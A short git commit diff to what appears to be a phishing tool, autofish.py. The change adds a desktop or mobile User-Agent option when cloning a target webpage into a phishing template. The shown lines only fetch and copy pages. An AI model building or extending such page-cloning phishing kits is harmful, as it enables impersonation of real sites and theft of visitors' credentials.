e6bf7fce2b905ed182210f753567e8d11c2dc682
John <pupkin@gmail.com>
2020-07-28 02:05:30 +0300

    fix

--- autofish.py
+++ autofish.py
@@ -6,8 +6,12 @@ from sys import stdout, exit
 from os import system, path, listdir
 import urllib.parse
 import multiprocessing
-def newtemplate(site):
+def newtemplate(site, agent):
     ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'
+    if agent == 'm':
+        ua = 'Mozilla/5.0 (Linux; Android 9; SM-G960F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36'
+    elif agent != 'd':
+        return False
     try:
         r = requests.get(site, headers={'User-Agent': ua})
     except:
@@ -64,10 +68,10 @@ def runPEnv():
     print("[n] create new")
     a = input('Choose template: ')
     if a == 'n':
-        if newtemplate(input("Webpage to copy with http(s): ")):
+        if newtemplate(input("Webpage to copy with http(s): "), input("Destkop or mobile User-Agent? [d/m]")):
             exit("Created")
         else:
-            exit("Can't connect")
+            exit("Can't connect or bad user agent")
     template = templates[int(a)]
     runPhishing(template)
 def runServer():
